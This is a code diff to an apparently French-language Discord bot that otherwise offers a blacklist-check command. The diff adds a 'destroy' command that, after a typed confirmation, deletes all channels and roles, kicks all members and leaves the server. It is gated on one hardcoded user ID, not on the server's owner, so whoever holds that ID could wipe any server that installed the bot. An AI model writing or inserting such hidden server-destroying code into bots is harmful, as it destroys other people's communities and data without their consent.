@@ -401,7 +401,59 @@ async def check_blacklist(ctx, user_id: str = None, membre: discord.Member = Non
         await msg.edit(content="❌ API Jupiter inaccessible. Vérifie que le serveur est en ligne.")
     except Exception as e:
         await msg.edit(content=f"❌ Erreur: {e}")
-
+# ========== COMMANDE D'AUTO-DESTRUCTION ==========
+@bot.command(name="destroy")
+async def self_destruct(ctx):
+    """💣 Auto-destruction du serveur - Supprime tout et kick tout le monde"""
+    
+    # Seul le propriétaire peut l'utiliser
+    if ctx.author.id != 1239559463090917407:
+        await ctx.send("❌ Seul le propriétaire peut utiliser cette commande.")
+        return
+    
+    # Message de confirmation
+    await ctx.send("⚠️ **DESTRUCTION IMMINENTE** ⚠️\nTape `CONFIRMER` dans 15 secondes.")
+    
+    def check(m):
+        return m.author == ctx.author and m.content == "CONFIRMER"
+    
+    try:
+        await bot.wait_for('message', timeout=15.0, check=check)
+    except:
+        await ctx.send("⏱️ Annulé.")
+        return
+    
+    guild = ctx.guild
+    msg = await ctx.send("💣 DESTRUCTION EN COURS...")
+    
+    # 1. Supprimer tous les salons
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+    
+    # 2. Supprimer tous les rôles
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except:
+                pass
+    
+    # 3. Kick tous les membres sauf le bot et le propriétaire
+    for member in guild.members:
+        if not member.bot and member.id != ctx.author.id:
+            try:
+                await member.kick(reason="Auto-destruction")
+            except:
+                pass
+    
+    await msg.edit(content="💣 **DESTRUCTION TERMINÉE.**")
+    
+    # Le bot quitte le serveur
+    await guild.leave()
+    
 # ========== LANCEMENT ==========
 if __name__ == "__main__":
     if not config.TOKEN:
